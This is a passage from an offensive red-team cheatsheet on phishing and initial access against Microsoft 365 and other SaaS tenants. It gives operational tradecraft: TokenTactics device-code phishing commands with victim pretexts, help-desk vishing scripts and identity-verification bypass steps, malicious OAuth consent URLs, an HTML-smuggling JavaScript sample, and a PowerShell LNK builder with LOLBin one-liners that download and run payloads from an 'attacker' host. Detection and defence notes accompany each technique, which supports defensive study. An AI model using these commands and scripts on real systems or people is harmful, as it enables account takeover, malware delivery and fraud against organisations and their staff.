  # login page. Victim authenticates normally (including MFA) → you capture
  # the session cookie. Import cookie into browser → full authenticated
  # access to victim's O365/Azure.

  Additional phishlets: google, okta, github, aws, linkedin, dropbox,
                        salesforce, citrix, custom-saml
  Custom phishlets: write YAML for any web application

COMMERCIAL AiTM-AS-A-SERVICE LANDSCAPE (Q2 2026):
  ❌ Tycoon 2FA            DISRUPTED March 2026 (Barracuda reporting)
  ✅ Mamba 2FA             Leading post-Tycoon market share (April 2026)
  ✅ EvilProxy             Rising post-disruption; subscription model
  ✅ Sneaky 2FA            Late-2025 entrant; aggressive obfuscation
  ⚠ ONNX Store             MS-disrupted 2024; variants persist
  ⚠ EvilGoPhish            Open-source; less capable but free

  Operational implication: kit traffic patterns are signatured by
  Defender for Office 365, Proofpoint, and Abnormal Security. Fresh
  infrastructure + custom phishlet outperforms off-the-shelf kit usage
  against mature targets.

DETECTION:
  - Entra ID Sign-in logs → unfamiliar sign-in properties, atypical
    travel, "suspicious browser" signal
  - Conditional Access "Require compliant device" blocks stolen cookies
    from the attacker's non-managed machine
  - Microsoft Defender for Cloud Apps / Defender XDR: AiTM-related alerts
    when stolen session token replayed on unmanaged device
  - Identity Protection elevates sign-in risk on anomalous token replay

OPSEC RATING: MEDIUM-HIGH at point of action; weakness tree:
  1. URL is on attacker domain — phishing-trained users notice
  2. Reverse-proxy patterns are fingerprinted by email gateways
  3. Token replay from unfamiliar device triggers risk scoring
  4. Against Token Protection + compliant-device CA, native-app replay
     blocked — operator must use browser-only paths or register attacker
     device as compliant (not trivial)
```

### 2.2 — Device Code Phishing

```
═══════════════════════════════════════════════════════════
DEVICE CODE PHISHING (T1566.002 + T1528)
MITRE ATT&CK: T1528 (Steal Application Access Token), T1566.002
STEALTH: HIGH (victim authenticates on legitimate microsoft.com)
SUCCESS: MED (declining as Auth Flows policy adoption grows)
SKILL: LOW
═══════════════════════════════════════════════════════════

MECHANISM:
  - Abuses OAuth 2.0 device authorization grant flow (RFC 8628)
  - Attacker generates a device code → victim enters it at
    microsoft.com/devicelogin → attacker receives victim's access +
    refresh tokens → persistent access
  - Victim never sees a fake login page (authenticates on real Microsoft)

TOOL: TokenTactics (PowerShell):
  Import-Module .\TokenTactics.psm1
  Get-AzureToken -Client MSGraph
  # Displays user_code (e.g., "ABCD1234") + device_code
  # Send user_code to victim with pretext:
  #   "Enter this code to access the shared document"
  # Victim visits https://microsoft.com/devicelogin → enters code →
  # authenticates → attacker receives tokens automatically

CUSTOM APP REGISTRATION VARIANT:
  Register app in attacker Azure tenant → request broad permissions →
  generate device code → phish victim → victim grants consent → tokens
  returned

CRITICAL DEFENSE — CONDITIONAL ACCESS "AUTHENTICATION FLOWS" POLICY:
  - Added Q4 2023; ENFORCEMENT September 2024 (per MS Learn)
  - https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-authentication-flows
  - Tenants can BLOCK device code flow per app, per user-group, per location
  - Operator pre-attempt check: probe whether target tenant blocks device
    code flow against a known-test app first
  - Modern security-conscious tenants (Microsoft, AWS, Google internal,
    most Fortune-500 finance) have device code flow blocked or restricted
  - SMB / less-mature tenants: still wide open

DETECTION:
  - Sign-in logs show "Device Code" authentication method
  - Conditional Access: block device code flow via "Authentication Flows"
    policy (Entra ID → Conditional Access → Conditions → Authentication
    Flows)
  - Defender XDR alerts on suspicious device code grants

OPSEC RATING: HIGH at point of action; declining viability against
  policy-aware tenants. Best for opportunistic / volume operations
  against non-MS-blue-team-mature tenants.
```

### 2.3 — Help Desk Vishing / Social Engineering

```
═══════════════════════════════════════════════════════════
HELP DESK VISHING — DOMINANT 2024-2026 MFA BYPASS
MITRE ATT&CK: T1566.004 (Spearphishing Voice), T1656 (Impersonation)
SCATTERED SPIDER / UNC3944 / OCTO TEMPEST / MUDDLED LIBRA pattern
STEALTH: MEDIUM-HIGH at help desk layer; HIGH detection cost post-MFA-reset
SUCCESS: HIGH
SKILL: MEDIUM (social engineering + pre-call OSINT)
═══════════════════════════════════════════════════════════

WHY THIS DOMINATES: targets the HUMAN authorized to bypass Token
Protection, FIDO2, Conditional Access, and EDR. Does not care about
technical defenses — the help desk agent has the privilege to defeat
all of them via authorized MFA reset.

CONTEXT (the intelligence operator should have):
  - Scattered Spider (also tracked as UNC3944, Octo Tempest, Muddled
    Libra) is the blueprint for English-speaking financial-crime groups
    collaborating with Russian-speaking ransomware affiliates.
  - CISA + FBI + RCMP + ASD ACSC + NCSC-UK joint advisory AA23-320A
    (last updated July 29, 2025) documents the help desk social
    engineering pattern with specific attribution and IoCs.
    Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
  - CrowdStrike GTR 2025: 442% increase in vishing attacks 2H2024 vs
    1H2024 — driven by GenAI-augmented social engineering.
  - DOJ charged Thalha Jubair (19, East London) Sept 2025 with $115M+
    ransom attribution; TTP continues through affiliates post-arrest.
  - Sector waves through 2025:
    * Q1: continued retail / hospitality (MGM resonance)
    * April-May 2025: UK retail (M&S, Co-op, Harrods via TCS contractor
      pivot, ~£300M profit impact at M&S)
    * June 2025: insurance sector (Erie 7th, Philadelphia 9th, Aflac 12th
      — ~13.9M PHI compromised across the wave)
    * June-July 2025: airline sector (WestJet 13th, Hawaiian 26th, Qantas
      30th — FBI alert issued)

MECHANISM:
  1. OSINT phase: identify target employee with access needed.
     LinkedIn → name, role, manager chain.
     Infostealer log market (Russian Market, Telegram channels) →
     employee's actual password from BYOD/personal device infection.
  2. Trigger: attacker has valid credential but cannot log in (MFA).
     Call the target's IT help desk posing as the employee.
  3. Pretext: "I just got a new phone and can't log in — can you reset
     my MFA?"
     High-stress scripts: "I'm about to present to the exec team in 10
     minutes — I need this reset NOW."
  4. Identity verification bypass: attacker has pre-harvested PII from
     OSINT (DoB, address, last 4 of SSN, employee ID from LinkedIn or
     public records) to pass the help desk's identity verification.
  5. Help desk resets MFA → attacker enrolls own device → logs in with
     valid credential + attacker-controlled MFA → full account access.
  6. Post-access: immediately harvest session cookies and refresh tokens,
     enroll additional persistence mechanisms before legitimate user
     notices the MFA takeover.

ADVANCED VARIATIONS:
  - REVERSE HELP DESK ATTACK: attacker poses as IT support, calls target
    directly, "walks them through" installing remote access tool
    (ScreenConnect, TeamViewer, AnyDesk). Target grants access believing
    it's troubleshooting. (See §3.8 remote-tool-as-implant.)
  - AI VOICE CLONING: deepfake voice of known executive or IT employee
    to pass voice-verification gates. Observed 2024-2025 campaigns —
    a few seconds of public video audio is sufficient for clone
    generation. Hong Kong $25M finance-team deepfake video call (Feb 2024)
    is the canonical example.
  - DEEPFAKE VIDEO CALL: full executive deepfake on Teams / Zoom for
    high-stakes finance transfer pretext. Real-time face-swap tools
    (DeepFaceLab live, FaceSwap) enable interactive deepfake conversation.
  - TEAMS / SLACK IMPERSONATION: help desk message via compromised
    third-party integration or look-alike tenant; sends malicious file
    or AnyDesk link. (See §2.7 Teams external chat phishing.)
  - SUPPLIER IMPERSONATION: target the CSO office with urgent "invoice
    dispute" from spoofed known vendor, invoking BEC-adjacent pressure.

TARGET SELECTION INDICATORS (pre-call recon):
  - Help desk / IT contractor roles listed on LinkedIn for the org
  - After-hours / weekend / holiday timing (reduced staffing, less
    verification depth)
  - Large distributed workforce (help desk less likely to know target
    personally)
  - Recent M&A / RIF / reorg activity (help desk expects new names;
    "I was just onboarded" or "I was just transitioned" pretext is
    plausible)
  - Known 3rd-party managed IT (Accenture, TCS, Wipro, CGI, Cognizant,
    Infosys) — outsourced help desks with scripted verification are the
    primary target. The UK retail wave specifically pivoted via TCS
    contractor compromise per Mandiant + ReliaQuest reporting.

WHAT BLOCKS THIS (defender posture awareness):
  - CALLBACK VERIFICATION — help desk calls the employee's HR-on-file
    number rather than the inbound number. The single highest-leverage
    defense.
  - MANAGER APPROVAL WORKFLOW — MFA reset requires ticket approval from
    employee's direct manager via out-of-band channel.
  - MULTIPLE-FACTOR IDENTITY VERIFICATION — employee ID + security
    question + video call with known face OR badge photo check.
  - DEDICATED HELP DESK SECURITY PRODUCT — Nametag, Specops Secure
    Service Desk, Persona — require employee to authenticate via separate
    MFA before help desk agent can act.
  - DEFENDER FOR IDENTITY / MDR BEHAVIOR ANALYTICS — flag MFA enrollment
    from unusual device immediately after help desk contact.

DETECTION (defender-side — know what catches you):
  - Entra ID audit log: "Update user authentication method" events
    correlated with help desk ticket timestamps. KQL detection in §10.6.
  - Anomalous MFA enrollment: new authentication method registered from
    IP geographically distant from user's typical sign-in pattern,
    within minutes of a password reset.
  - First-time sign-in from new MFA method → immediate data access
    pattern (mass SharePoint download, inbox rule creation, OAuth
    consent).
  - Help desk ticketing system: outbound calls vs inbound — inbound-only
    MFA resets without callback verification are a process flag.

OPERATIONAL NOTES (red team emulation):
  - Social engineering technique, not technical. Authorization must
    explicitly cover voice-based social engineering of staff.
  - RoE should specify whether help desk can be targeted directly or
    only via simulated (tabletop / purple team) vishing.
  - Pre-call OSINT phase is most of the work; the call itself is under
    a minute.

OPSEC RATING: MEDIUM-HIGH at help desk layer; detection shifts to
  post-MFA-reset anomalous sign-in behavior. MDI + mature SOC closes
  the window in minutes-to-hours.
```

### 2.4 — ClickFix / Paste-and-Run / Fake CAPTCHA

```
═══════════════════════════════════════════════════════════
CLICKFIX / FAKE CAPTCHA / PASTE-AND-RUN
MITRE ATT&CK: T1204.001 (User Execution: Malicious Link), T1566.002
STEALTH: MEDIUM (high user-interaction signal)
SUCCESS: HIGH (against orgs without ASR / AppLocker policies for
              user-initiated PowerShell)
SKILL: LOW
═══════════════════════════════════════════════════════════

EMERGENT 2024-2025 PATTERN — browser-based social engineering that tricks
the user into manually executing an attacker command on their own machine.
Bypasses email attachment inspection entirely (no attachment is sent).

OBSERVED CAMPAIGNS 2024-2026:
  - Storm-2372 (financially motivated, Q4 2024+)
  - Lazarus Group / APT38 ClickFix variants targeting crypto employees
    (Q1 2025)
  - Multiple commodity malware families (Lumma, RedLine, StealC) using
    ClickFix as primary delivery (throughout 2025)
  - Mac-targeted ClickFix variants (terminal command paste pretext)
    observed Q2 2025

MECHANISM:
  1. User directed to attacker landing page (SEO poisoning, malvertising,
     compromised legitimate site, phishing link).
  2. Landing page displays fake "verification" UI: bogus CAPTCHA, fake
     browser/Windows "error" dialog, fake Cloudflare challenge, fake
     document viewer permission prompt.
  3. Page instructs user to: press Win+R, paste this "verification code"
     into the Run dialog, and press Enter. The "code" is an obfuscated
     PowerShell command that downloads and executes the attacker payload.
  4. JavaScript on the page uses the browser clipboard API to place the
     malicious command into the clipboard without the user explicitly
     copying anything visible.
  5. User pastes into Run → payload executes under their account context.

PAYLOAD PATTERN (operator awareness):
  Pasted command typically: mshta.exe / powershell.exe invocation reaching
  attacker-hosted script, with comment-style prefix that looks like a
  "verification code" or "CAPTCHA answer" to hide shell content.

EFFECTIVENESS:
  - Bypasses email gateway attachment analysis (no attachment)
  - Bypasses most download-reputation systems (user types/pastes command)
  - The user is the execution mechanism — EDR sees user-spawned PowerShell
    via explorer.exe → Run dialog, an unusual but not blocked pattern on
    many endpoints
  - Attack surface: remote workers, BYOD, employees with local admin

DETECTION:
  - Sysmon Event ID 1: explorer.exe spawning powershell.exe / mshta.exe /
    cmd.exe with network-bound commands (IEX, Invoke-WebRequest,
    DownloadString)
  - The behavioral signature: user-typed command line containing base64 /
    http(s) URL / PowerShell download cradle
  - Defender for Endpoint and other mature EDRs flag clipboard-to-Run-
    dialog patterns as of late 2024
  - KQL detection in §10.6

DEFENSES:
  - Disable Win+R Run dialog via GPO for standard users (high-friction
    but effective)
  - AppLocker / WDAC policy blocking user-initiated PowerShell from
    interactive sessions without explicit allowlisting
  - User awareness training specifically covering this pattern (most
    training still focuses on email attachments / links, not paste-and-
    run)

OPSEC RATING: MEDIUM — high user-interaction signal but effective against
  organizations without targeted ASR/AppLocker policies; increasingly
  flagged by EDR behavioral rules through 2025-2026.
```

### 2.5 — OAuth Consent Phishing

```
═══════════════════════════════════════════════════════════
OAUTH CONSENT PHISHING (cross-SaaS expansion)
MITRE ATT&CK: T1566.002, T1550.001 (Application Access Token),
              T1528 (Steal Application Access Token)
STEALTH: HIGH (persistent access survives password changes)
SUCCESS: MED (declining as user-consent settings tighten across SaaS)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

MICROSOFT 365 / ENTRA ID:
  Register malicious app in attacker-controlled Azure tenant.
  Request permissions the USER can consent to (no admin needed):
    Mail.Read, Files.ReadWrite.All, Calendars.Read, Contacts.Read,
    offline_access (refresh token persistence)
  NOTE: User.Read.All, Directory.Read.All, etc. require ADMIN consent —
    a normal user cannot approve these. Target admin users or use only
    user-consentable scopes for broad phishing campaigns.
  Send phishing link → victim clicks → consent prompt → victim approves
  → attacker app has persistent API access to victim's data.

  Phishing URL pattern:
    https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
      client_id=<ATTACKER_APP_ID>&response_type=code
      &redirect_uri=<ATTACKER_SERVER>
      &scope=https://graph.microsoft.com/.default

MODERN DEFENDER POSTURE (changed 2023-2025):
  - User consent settings: Microsoft default changed in 2023. "Users can
    consent to apps from VERIFIED PUBLISHERS" is now the default, not
    "Users can consent to any app." Unverified publishers trigger
    additional warning dialogs.
  - Admin consent workflow: when an app requires admin consent, a request
    is raised to the admin rather than silent failure — admin can deny.
  - Entra "Enterprise applications" permission review: periodic admin
    review of consented apps now enforced in many tenants via CA.

NATION-STATE EXAMPLE — Midnight Blizzard / APT29 (Microsoft, Jan 2024):
  Attackers compromised a legacy non-production test tenant via password
  spray (no MFA), registered a malicious OAuth app with Exchange Online
  permissions, then granted cross-tenant access from production Microsoft
  corporate tenant to the malicious app, enabling mailbox access.
  Source: https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/
  This is the canonical modern OAuth-consent-via-test-tenant pattern.

POWER PLATFORM / POWER APPS / POWER AUTOMATE OAUTH ABUSE:
  - Power Automate connectors run with delegated user permissions
  - Compromise of Power Automate enables persistent automation of
    SharePoint downloads, email forwarding, file-system mirror to
    attacker-controlled OneDrive
  - Sapphire Werewolf 2024 pattern: malicious Power Automate flow
    auto-forwarding email + creating cloud-side persistence
  - Premium connectors (HTTP, SQL, custom APIs) enable arbitrary outbound
    HTTP from within Microsoft's IP space — bypasses network egress filters

AZURE LOGIC APPS CONNECTOR ABUSE:
  - Logic Apps similar to Power Automate but with broader enterprise scope
  - Compromised user with Logic Apps permissions can stand up persistent
    connectors to Salesforce, ServiceNow, AWS, GCP, on-prem AD
  - Workflow runs from Microsoft IP space; appears as legitimate enterprise
    automation traffic

SALESFORCE CONNECTED APPS ABUSE:
  - Salesforce OAuth grants similar to M365 — Connected Apps with
    user-grant scope (api, refresh_token) provide persistent CRM access
  - Distribution: phishing link to Salesforce's OAuth approval page;
    URL pattern: https://login.salesforce.com/services/oauth2/authorize?
                 response_type=code&client_id=<atk_app>&redirect_uri=<atk>
  - Common scopes phished: api, refresh_token, full, web

AWS IAM IDENTITY CENTER (FORMERLY SSO) ABUSE:
  - IAM Identity Center session hijack via OAuth-style federation
  - Compromise of one IAM Identity Center session → access to all assigned
    AWS account permissions for that user
  - Session token replay across accounts where role-assignment is
    automatic-on-sign-in

GOOGLE WORKSPACE OAUTH:
  - Parallels M365 — malicious app requests Gmail / Drive scopes
  - Workspace admin can blocklist/allowlist apps via Admin Console
  - App Verification process (Google Cloud Trust & Safety review) — most
    aggressive scopes require Google review; bypasses by avoiding
    "sensitive scopes"

DETECTION:
  - O365 UAL "Consent to application" events
  - Entra ID: "Enterprise applications" → user consent settings audit
  - Defender for Cloud Apps: "Unusual addition of credentials to OAuth
    app" + "Suspicious OAuth app file download activities" alerts
  - Salesforce Event Monitoring: ApiEvent + ConsentEvent
  - AWS CloudTrail: ListAccounts, AssumeRoleWithSAML cross-account
    patterns
  - KQL hunt for sensitive-scope grants in §10.6

OPSEC RATING: HIGH at point of action; declining vs. mature consent-
  policy targets. Best for sustained access; survives password changes
  but tokens revocable via admin app removal.
```

### 2.6 — AI-Augmented Phishing

```
═══════════════════════════════════════════════════════════
AI-AUGMENTED PHISHING — DEEPFAKE + LLM HYPER-PERSONALIZATION
MITRE ATT&CK: T1566 (Phishing), T1656 (Impersonation), T1585.003 (Cloud Acct)
STEALTH: HIGH    SUCCESS: MED-HIGH    SKILL: MEDIUM
DETECTION: LOW (content quality bypasses traditional gateway heuristics)
═══════════════════════════════════════════════════════════

LLM-DRIVEN HYPER-PERSONALIZATION:
  - Per-target ChatGPT/Claude/Gemini-driven lure generation matched to
    target's role, recent posts, technical vocabulary, communication style
  - Eliminates traditional phishing "smell" indicators (grammar errors,
    awkward phrasing, generic templating)
  - Mass deployment: prompt template + scraped LinkedIn data → 10,000
    bespoke spearphish messages
  - CrowdStrike GTR 2025: "GenAI-augmented social engineering" cited as
    primary driver of 442% vishing surge

DEEPFAKE VOICE FOR VISHING:
  - 3-5 seconds of public video audio (LinkedIn talk, conference recording,
    podcast interview) sufficient for clone generation
  - Tools: ElevenLabs, Resemble.AI, Replica Studios, Tortoise-TTS (OSS)
  - Pretext: voice-of-CEO authorizing finance transfer; voice-of-IT
    walking employee through "MFA reset"; voice-of-vendor confirming
    "invoice dispute"
  - OBSERVED IMPACT: Hong Kong $25M finance-team deepfake video call
    (Feb 2024) — multiple senior execs cloned for live deepfake group
    Zoom call, finance team authorized $25M transfer based on what they
    believed was a CFO-led group call
  - Multiple US/UK incidents 2024-2025 with smaller dollar values

DEEPFAKE VIDEO CALL:
  - Real-time face-swap on Zoom / Teams / Meet
  - Tools: DeepFaceLab live, FaceSwap, AvatarHQ
  - Common pretext: emergency executive video call authorizing privileged
    action (wire transfer, MFA reset, contract signature)
  - Scattered Spider 2025 pattern: deepfake video as part of help-desk
    verification bypass — "we're on a video call, see — it's me"

DEFENSE-SIDE COUNTERMEASURES (operator awareness):
  - Liveness detection in identity verification (look at the camera,
    turn your head, blink — current real-time deepfake struggles with
    rapid head turns + lighting changes)
  - Out-of-band callback to known number for authorization gates
  - Multi-person sign-off for high-value financial transactions
  - Pre-shared verbal codewords for executive-level authorization

DETECTION:
  - Sender domain age + reputation (still applies; LLM doesn't fix bad
    infrastructure)
  - Defender for Office 365 + Abnormal Security: behavioral inbox
    anomaly (sender pattern deviation, content+context mismatch)
  - Email authentication (SPF/DKIM/DMARC) — LLM doesn't fix sender
    impersonation if the domain is wrong
  - Voice/video deepfake detection: Pindrop, Reality Defender, McAfee
    Deepfake Detector — emerging capability in 2025-2026

OPSEC RATING: HIGH at content layer; infrastructure layer (sender domain,
  IP reputation) is still the bottleneck.
```

### 2.7 — Microsoft Teams External Chat Phishing

```
═══════════════════════════════════════════════════════════
MICROSOFT TEAMS EXTERNAL CHAT PHISHING
MITRE ATT&CK: T1566.003 (Spearphishing via Service)
STEALTH: HIGH (originates from legitimate Microsoft tenant)
SUCCESS: MED
SKILL: LOW
═══════════════════════════════════════════════════════════

MECHANISM:
  - Compromise (or register) a Microsoft 365 tenant the target's tenant
    trusts for external collaboration (or default Teams external policy)
  - Send Teams chat message from attacker tenant → target user receives
    in Teams with sender-tenant attribution (often shows as "External"
    badge)
  - Pretext: IT support, HR, vendor, partner
  - Attached: malicious file (often ScreenConnect installer disguised),
    malicious link to AiTM page, MFA-approval bait

KEY CASE STUDY — Midnight Blizzard / APT29 (Microsoft, Jan 2024):
  - Attackers used Teams external messages to send MFA approval bait to
    Microsoft employees
  - The compromised tenant was a legitimate Microsoft customer tenant —
    appeared as legitimate Teams interaction
  - Pretext: IT-support persona requesting MFA re-approval
  - Source: https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/

CURRENT VARIANTS (Q1-Q2 2026):
  - Storm-2370 / financially motivated affiliate using Teams external
    messaging for ScreenConnect installer delivery
  - Vishing follow-on: Teams chat introduces the attacker, then call
    follows on phone for MFA reset social engineering
  - Multi-tenant attacker network: rotating compromised tenants used as
    sender infrastructure

CONFIGURATION CONTEXT:
  - Default Teams policy allows external messaging from any Microsoft
    tenant (changed default in Q4 2024 to "blocked external" for new
    tenants — older tenants retain legacy permissive default)
  - Defender for Office 365 Teams Plan 2 protection extends Safe Links
    + Safe Attachments to Teams
  - Operator implication: target tenants with permissive external
    messaging policy (legacy enterprises commonly retain it)

DETECTION:
  - Teams admin audit logs: "External user added", "Chat with external
    user"
  - Defender for Office 365 Teams scanning
  - User-reported Teams phishing (currently lower than email-reported
    rate — users underestimate Teams as phishing vector)

OPSEC RATING: HIGH — sender appears as legitimate Microsoft tenant;
  Teams interface adds trust signal users associate with internal
  collaboration. Detection lags vs. email phishing.
```

### 2.8 — Traditional Credential Harvest + HTML / QR / BitB

```
═══════════════════════════════════════════════════════════
SUPPORTING TECHNIQUES (for completeness — modern viability varies)
MITRE ATT&CK: T1566.002, T1027.006 (HTML Smuggling)
═══════════════════════════════════════════════════════════

CREDENTIAL HARVEST (no AiTM):
  Viable only against the shrinking set of orgs without MFA. Against
  any MFA-enforced target, credential-only phishing produces username/
  password pairs that still require a separate MFA-bypass path (AiTM,
  help desk vishing, SIM swap). Plan accordingly.

  Tools:
  - GoPhish (campaign management) — see §1.3 caveats
  - Modlishka — ❌ ABANDONED upstream since ~2023; superseded by Evilginx3
    + muraena. Do not use in current operations.
  - muraena — ✅ maintained alternative to Evilginx, phishlet-compatible

HTML SMUGGLING (T1027.006):
  HTML email with embedded JavaScript that assembles payload client-side
  inside victim's browser. Bypasses email gateway attachment inspection
  because the payload is not transmitted as a file — it's constructed in
  memory and presented as a download via Blob + URL.createObjectURL.

  Sample pattern:
    <script>
    var b64 = "TVqQAAMAAAA...";  // Base64-encoded payload
    var raw = atob(b64);
    var arr = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
    var blob = new Blob([arr], {type:'application/octet-stream'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'document.iso';
    document.body.appendChild(a); a.click();
    </script>

QR CODE PHISHING (QUISHING):
  - Used by Kimsuky (DPRK) in 2025 campaigns (FBI alert):
    Source: https://www.fbi.gov/file-repository/cyber-alerts/north-korean-kimsuky-actors-leverage-malicious-qr.pdf
  - Also observed in BEC targeting finance teams + mobile-only users
  - Embed QR code in email → bypasses URL rewriting/inspection
  - QR points to AiTM proxy or credential harvest page
  - Effective because: email gateways don't scan QR code content;
    mobile devices scan QR → browser loads attacker page on phone
    (often lower security controls than corporate laptop)

BROWSER-IN-THE-BROWSER (BitB) PHISHING:
  - Render fake "OS window" inside attacker page containing simulated
    OAuth popup (with fake https://login.microsoftonline.com URL bar
    rendered in HTML/CSS)
  - Defeats URL inspection because displayed URL is a DOM element, not
    real address bar
  - Reference kits: phish-in-the-middle / mrd0x BitB templates
  - Effective against users who rely on visual URL verification; less
    effective on browsers with URL-bar prominence (Edge, Safari)

SHAREPOINT / ONEDRIVE LEGITIMATE-INFRA HOSTING:
  - SharePoint / OneDrive shared links to malicious files hosted on
    legitimate Microsoft infrastructure — bypasses attachment filtering
    because file is hosted on trusted domain
  - Pattern: compromise low-value M365 tenant → upload payload to its
    SharePoint → share externally with target → target receives link
    that resolves to *.sharepoint.com (trusted) → downloads payload

DETECTION:
  - Email gateway logs, phishing report analysis
  - Defender for Office 365 Safe Links + Safe Attachments
  - Teams external communication monitoring
  - URL rewriting + sandbox detonation

OPSEC: Domain age (§1.1), SSL cert quality, and email warmup are
  critical for delivery. Modern email gateways (Defender for Office 365
  Plan 2, Proofpoint, Abnormal Security, Mimecast) catch most off-the-
  shelf credential-harvest infrastructure within hours of deployment.
```

```
═══════════════════════════════════════════════════════════
SECTION 2 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §7 cloud expansion (stolen tokens → cloud-API access)
Enables → §6 remote services (stolen creds → VPN/RDP/SSH)
Enables → §03 Persistence (cookies + tokens enable persistent re-entry)
Prereq → §1 attack infrastructure
Cross-ref → §3.8 remote-tool-as-implant (post-vishing follow-on)
Cross-ref → §7.5 identity-plane post-foothold (GraphRunner / GraphSpy /
            TokenSmith for token replay enumeration)
Cross-ref → §10.6 KQL hunting queries (help desk, AiTM, ClickFix,
            OAuth, infostealer detection)
```

---

## 3 — PHISHING: PAYLOAD DELIVERY

> **Typical chains through this section:** Email/Teams/web vector delivers payload → user execution under their account context → first-stage loader → C2 callback → handoff to defense-evasion + privilege-escalation tradecraft (other cheatsheets). For 2026: macros are dead; modern operators use HTML smuggling → LNK/DLL-sideload chains, SVG smuggling, search-ms protocol abuse, MSIX, or remote-tool-as-implant (Scattered Spider preferred).

### 3.1 — 2026 Payload Viability Matrix

```
═══════════════════════════════════════════════════════════
PAYLOAD VIABILITY MATRIX (Q2 2026)
═══════════════════════════════════════════════════════════

DEAD / UNRELIABLE (do NOT use in operational delivery):
  ❌ VBA macros in Office docs from internet
       BLOCKED by Microsoft (default since July 2022)
  ❌ ISO/IMG MOTW bypass
       PATCHED by Microsoft (November 2022)
  ❌ OneNote embedded dangerous files
       BLOCKED by Microsoft (April 2023)
  ❌ .docm/.xlsm from email
       Mark-of-the-Web blocks macro execution by default

STILL VIABLE (with effort):
  ✅ HTML smuggling → LNK / ZIP / payload chain
  ✅ LNK files with embedded LOLBin commands (+ icon spoofing)
  ✅ DLL sideloading (signed EXE + malicious DLL in ZIP)
  ✅ MSI packages (if AlwaysInstallElevated or user runs as admin)
  ✅ SVG smuggling (script tags in SVG payload — popularized 2024)
  ✅ search-ms protocol abuse (Windows Search redirect to malware)
  ✅ MSIX installer abuse (signed MSIX bypasses MOTW for elevated exec)
  ✅ Browser exploit + drive-by download (rare, very high cost)
  ✅ Trojanized installers (supply chain or watering hole delivery)
  ✅ XLL (Excel add-in) — some environments still allow
  ✅ Windows shortcut (.lnk) with LOLBin execution chain
  ✅ CHM (Compiled HTML Help) — still allowed in some environments
  ✅ Browser extension installation (post-phishing follow-up)
  ✅ Remote-desktop tool as implant (TeamViewer / AnyDesk / ScreenConnect)
       — DOMINANT 2024-2026 financial-crime pattern

BEST CURRENT APPROACH (high success rate, modern EDR-aware):
  HTML smuggling email → drops ZIP → contains signed EXE + malicious DLL
  (sideload). OR HTML smuggling → LNK file → LOLBin execution chain.
  OR vishing introduction → ScreenConnect installer (signed legitimate
  binary, bypasses payload-detection layers).
```

### 3.2 — LNK + LOLBin Execution

```
═══════════════════════════════════════════════════════════
LNK + LOLBIN EXECUTION CHAIN
MITRE ATT&CK: T1566.001 (Spearphishing Attachment), T1204.002 (User Exec
              Malicious File), T1218 (Signed Binary Proxy Execution)
STEALTH: MEDIUM (LOLBins well-known; signature drift)
SUCCESS: MEDIUM (against modern EDR with cloud-delivered protection)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

CREATE MALICIOUS LNK USING LOLBINS:
  PowerShell:
  $wsh = New-Object -ComObject WScript.Shell
  $lnk = $wsh.CreateShortcut("$env:TEMP\Report.lnk")
  $lnk.TargetPath = "C:\Windows\System32\mshta.exe"
  $lnk.Arguments = "javascript:a=GetObject('script:http://attacker/payload.sct').Exec()"
  $lnk.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"
  $lnk.Save()
  # LNK icon shows Word document — victim clicks → mshta executes payload

ALTERNATIVE LOLBIN CHAINS (signature drift expected; verify in current
LOLBAS database before operational use — https://lolbas-project.github.io):
  - regsvr32.exe /s /n /u /i:http://attacker/file.sct scrobj.dll
  - rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();
    GetObject("script:http://attacker/payload.sct")
  - certutil -urlcache -split -f http://attacker/payload.exe %TEMP%\payload.exe
    && %TEMP%\payload.exe
  - msiexec /q /i http://attacker/payload.msi
  - bitsadmin /transfer N http://attacker/payload.exe %TEMP%\p.exe & %TEMP%\p.exe
  - InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\payload.dll

DETECTION:
  - Sysmon Event ID 1: mshta / regsvr32 / rundll32 / certutil with network args
  - EDR behavioral rules: parent-process explorer.exe + network-bound LOLBin
  - Email gateway: LNK file detection, nested archive analysis
  - ASR rule "Block credential stealing from LSASS" — partial coverage
  - ASR rule "Block executable files from running unless they meet a
    prevalence, age, or trusted list criteria" — blocks LOLBin abuse if enabled

OPSEC RATING: MEDIUM — LOLBins well-known but still effective against
  orgs without aggressive ASR / WDAC / AppLocker enforcement.
```

### 3.3 — DLL Sideloading Package

```
═══════════════════════════════════════════════════════════
DLL SIDELOADING (PROXY DLL)
MITRE ATT&CK: T1574.002 (DLL Side-Loading), T1566.001
STEALTH: MEDIUM-HIGH (against legacy / less-mature EDR)
SUCCESS: MEDIUM (against modern EDR — see detection below)
SKILL: HIGH (proxy DLL development)
═══════════════════════════════════════════════════════════

PACKAGE CONSTRUCTION:
  Signed legitimate EXE + malicious DLL (proxy DLL) packaged together.
  Deliver via: HTML smuggling → ZIP, or direct ZIP attachment.

PROCESS (cross-ref Persistence cheatsheet §2 for SharpDllProxy details):
  1. Find signed EXE that loads a DLL from its directory (Process Monitor
     analysis)
  2. Create proxy DLL (SharpDllProxy / manual .def file)
  3. Package signed EXE + proxy DLL + renamed original DLL in ZIP
  4. Deliver ZIP → victim extracts → runs signed EXE → your DLL loads
     into the trusted process context

COMMON SIDELOADING TARGETS (signed EXEs that load DLLs from CWD):
  - OneDrive updater → version.dll
  - Zoom → various DLLs
  - Microsoft Teams → various DLLs
  - Many vendor update utilities (WinSCP updater, Notepad++ updater,
    7-Zip updater, VLC updater)
  - Google Chrome enterprise installer
  - Cisco WebEx / Cisco Secure Client installers

DETECTION:
  - Sysmon Event ID 7: DLL loaded from unexpected path
  - Signed EXE running from user temp/downloads directory
  - Modern EDRs inspect DLL content/provenance regardless of loader
    signature; image load anomalies from user-writable paths are first-
    class detection signals
